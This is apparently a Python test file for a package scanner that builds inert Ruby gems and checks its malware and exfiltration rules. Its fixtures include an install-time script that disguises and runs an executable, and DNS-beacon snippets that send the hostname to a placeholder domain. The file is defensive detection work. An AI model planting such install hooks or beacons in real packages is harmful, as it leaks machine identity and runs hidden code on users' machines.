"""A published gem's native-extension scripts run at install (`Engine._gem_extension_hooks`).

A built `.gem` names them only in `metadata.gz`; the fixture gem is built in memory and inert.
"""

from __future__ import annotations

import gzip
import io
import tarfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.config import Config


class Gem:
    @staticmethod
    def tar(files: dict[str, bytes]) -> bytes:
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w") as archive:
            for name, data in files.items():
                info = tarfile.TarInfo(name)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        return buffer.getvalue()

    @classmethod
    def build(cls, tmp_path: Path, extensions: list[str], files: dict[str, str]) -> Path:
        listed = "".join(f"- {e}\n" for e in extensions) if extensions else ""
        metadata = (
            "--- !ruby/object:Gem::Specification\nname: demo\nversion: !ruby/object:Gem::Version\n"
            f"  version: 0.1.0\nextensions:{'' if extensions else ' []'}\n{listed}"
            "executables: []\n"
        )
        data = cls.tar({name: text.encode() for name, text in files.items()})
        target = tmp_path / "demo-0.1.0.gem"
        target.write_bytes(
            cls.tar(
                {
                    "metadata.gz": gzip.compress(metadata.encode()),
                    "data.tar.gz": gzip.compress(data),
                }
            )
        )
        return target

    @staticmethod
    def rules(target: Path) -> set[str]:
        return {
            f.rule_id
            for f in Scanner(Config.default().with_overrides(use_cache=False)).scan(target).findings
        }


class TestGemExtensions:
    EXTCONF = 'File.rename("aaa.png", "a.exe")\nexec("a.exe")\n'

    def test_a_listed_extension_runs_at_install(self, tmp_path):
        gem = Gem.build(tmp_path, ["ext/demo/extconf.rb"], {"ext/demo/extconf.rb": self.EXTCONF})
        assert "MALWARE.INSTALL.DISGUISED_PROGRAM.001" in Gem.rules(gem)

    def test_the_same_file_unlisted_is_not_install_code(self, tmp_path):
        gem = Gem.build(tmp_path, [], {"ext/demo/extconf.rb": self.EXTCONF})
        found = Gem.rules(gem)
        assert "MALWARE.INSTALL.DISGUISED_PROGRAM.001" not in found
        assert "SUSPECT.FILE.DISGUISED_PROGRAM.001" in found


class TestPlaceholderRelease:
    @staticmethod
    def gem(tmp_path: Path, summary: str, files: dict[str, str]) -> Path:
        metadata = (
            "--- !ruby/object:Gem::Specification\nname: zz-demo\nversion: !ruby/object:Gem::Version\n"
            f"  version: 0.0.1\nsummary: {summary}\nextensions: []\nexecutables: []\n"
        )
        data = Gem.tar({name: text.encode() for name, text in files.items()})
        target = tmp_path / "zz-demo-0.0.1.gem"
        target.write_bytes(
            Gem.tar(
                {
                    "metadata.gz": gzip.compress(metadata.encode()),
                    "data.tar.gz": gzip.compress(data),
                }
            )
        )
        return target

    def test_no_code_under_a_throwaway_summary(self, tmp_path):
        target = self.gem(tmp_path, "x", {"lib/a.rb": ""})
        assert "SUSPECT.PACKAGE.PLACEHOLDER_RELEASE.001" in Gem.rules(target)

    def test_a_shim_that_says_what_it_is_is_not(self, tmp_path):
        target = self.gem(tmp_path, "Legacy shim. Use 'text' instead.", {})
        assert "SUSPECT.PACKAGE.PLACEHOLDER_RELEASE.001" not in Gem.rules(target)

    def test_a_gem_with_code_is_not(self, tmp_path):
        code = "module Demo\n  def self.add(a, b)\n    a + b\n  end\nend\n"
        target = self.gem(tmp_path, "x", {"lib/demo.rb": code})
        assert "SUSPECT.PACKAGE.PLACEHOLDER_RELEASE.001" not in Gem.rules(target)


class TestRubyBeacons:
    def test_a_dns_name_built_from_data_and_the_machines_identity(self, tmp_path):
        source = (
            "require 'resolv'\n"
            "data = Socket.gethostname.unpack('H*')[0]\n"
            "Resolv." + "getaddress 'v2.' + data + '.dns.example.invalid'\n"
        )
        gem = Gem.build(tmp_path, ["ext/demo/extconf.rb"], {"ext/demo/extconf.rb": source})
        found = Gem.rules(gem)
        assert found & {"MALWARE.EXFIL.BEACON.001", "SUSPECT.EXFIL.DNS.001"}

    def test_a_lookup_carrying_the_hostname(self, tmp_path):
        source = "`ping $(" + "hostname | base64).dns.example.invalid`\nrequire 'mkmf'\n"
        gem = Gem.build(tmp_path, ["ext/demo/extconf.rb"], {"ext/demo/extconf.rb": source})
        assert "SUSPECT.EXFIL.COMMAND_BEACON.001" in Gem.rules(gem)
